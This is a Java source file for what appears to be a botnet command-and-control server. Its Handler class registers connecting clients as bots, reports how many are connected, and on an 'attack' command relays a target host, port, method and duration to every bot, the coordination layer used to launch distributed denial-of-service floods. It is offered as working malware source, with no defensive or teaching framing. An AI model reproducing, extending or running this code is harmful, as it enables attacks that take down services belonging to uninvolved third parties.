package sg.Chearstern;

import lombok.Getter;
import lombok.SneakyThrows;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

@Getter
public class Handler implements Runnable {

    private Socket s;
    private BufferedReader in;
    private PrintWriter out;

    public Handler(Socket s) {
        this.s = s;
    }

    @SneakyThrows
    @Override
    public void run() {
        this.in = new BufferedReader(new InputStreamReader(s.getInputStream()));
        this.out = new PrintWriter(s.getOutputStream(), true);

        String recive;
        while ((recive = in.readLine()) != null) {

            System.out.println(recive);
            JSONObject jsonObject = new JSONObject(recive);
            switch (jsonObject.getString("action")) {
                case "connect":
                    Bots.numBots.add(this);
                    break;
                case "numBots":
                    JSONObject numBots = new JSONObject();
                    numBots.put("status", 0);
                    numBots.put("numBots", Bots.numBots.size());
                    System.out.println(numBots);
                    getOut().println(numBots);
                    break;
                case "attack":
                    JSONObject attackToServer = new JSONObject();
                    this.attack(jsonObject.getString("host"), jsonObject.getInt("port"), jsonObject.getString("method"), jsonObject.getInt("duration"));
                    attackToServer.put("status", "0");
                    getOut().println(attackToServer);
                    break;
            }
        }
    }

    private void attack(String host, int port, String method, int duration) {
        for (Handler h : Bots.numBots) {
            JSONObject json = new JSONObject();
            json.put("action", "attack");
            json.put("host", host);
            json.put("port", port);
            json.put("method", method);
            json.put("duration", duration);

            h.getOut().println(json.toString());
        }
    }
}
